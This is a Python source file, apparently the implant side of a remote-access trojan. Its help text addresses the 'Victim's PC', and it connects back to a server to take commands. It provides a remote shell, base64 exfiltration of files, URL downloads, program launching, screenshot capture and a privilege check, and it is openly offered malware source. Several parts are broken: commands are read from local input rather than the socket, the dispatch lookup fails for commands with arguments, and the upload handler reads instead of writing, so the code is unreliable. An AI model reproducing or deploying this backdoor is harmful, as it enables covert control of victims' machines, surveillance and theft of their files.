!/usr/bin/python3

import socket
import requests 
import json 
import base64
import os
import time
import shutil
import sys
import subprocess
from mss import mss

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   #TCP-подключение через IPv4

def data_send(data):
    json_data = json.dumps(data)
    sock.send(json_data.encode())

def data_recv():
    json_data = b""
    while True:
        try:
            recv = sock.recv(1024)
            if not recv:
                break
            json_data += recv
            decoded_data = json.loads(json_data.decode())
            return decoded_data
        except ValueError:
            continue

def connection(IP, port):
    while True:
        time.sleep(5)
        try:
            sock.connect((IP , port))
            shell()
        except:
            data_send("~[*] Something is Wrong... Please Try Again")
            connection(IP, port)

def cd_command(command):
    try:
        os.chdir(command[3:])
    except:
        data_send("~[*]Failed to Change Directory")
        pass


def download_command(command):
    try:
        with open(command[9:], "rb") as file:
            data_send(base64.b64encode(file.read()))
    except: 
        data_send("~[*]Failed to Download")
        pass

def upload_command(command):
    try:
        with open(command[7:], "rb") as file:
            data_send(base64.b64encode(file.read()))
    except:
        data_send("~[*]Failed to Upload") 

def get_command(command):
    try:
        response = requests.get(command[4:])
        if response.status_code == 200:
            with open("downloaded_file", "wb") as f:
                f.write(response.content)
                data_send("~[*]File downloaded successfully.")
        else:
            data_send("~[*]Failed to download file.")
    except:
        data_send("~[*]Failed to download")

def start_command(command):
    subprocess.Popen(command[6:], shell=True)
    data_send("~[*]Started")

def screenshot_command(command):
    try:
        screenshot()
        with open("monitor-1.png", "rb") as sc:
            data_send(base64.b64encode(sc.read()))
            os.remove("monitor-1.png")
    except:
        data_send("~[*]Failed to save screenshot")

def check_command(command):
    try:
        admin_check()
        data_send(admin)
    except:
        data_send("~[*]Failed to check")

def help_command(command):
    help_opt = '''download ---> Download File From Victim's PC to Server
upload ---> Upload File From Server to Victim's PC
get ---> Download File From Link
start ---> Start Program on Victim's PC
screenshot ---> Take a Screenshot on Victim's PC
check ---> Check Privileges 
q ---> Quit'''
    data_send(help_opt)

command_options = {
    "cd": cd_command,
    "download": download_command,
    "upload": upload_command,
    "get": get_command,
    "start": start_command,
    "screenshot": screenshot_command,
    "check": check_command,
    "help": help_command
}

def shell():
    while True:
        command = input("Enter command: ")
        if command == "q":
            break
        else:
            command_fn = command_options.get(command)
            if command_fn:
                command_fn(command)
            else:
                try:
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    result = proc.stdout.read() + proc.stderr.read()
                    data_send(result.decode())
                except Exception as e:
                    data_send(str(e))


def screenshot():
    with mss() as screenshot:
        screenshot.shot()      

def admin_check():
    global admin
    try:
        temp = os.listdir(os.sep.join(([os.environ.get('SystemRoot', 'C:\\windows', 'temp')])))
        admin = True
    except:
        admin = False
    return admin

def main():
    IP = input("Server IP: ")
    port = int(input("Destination Port: "))
    connection(IP, port)
    admin_check()
    sock.close()

if __name__ == "__main__":
    main()
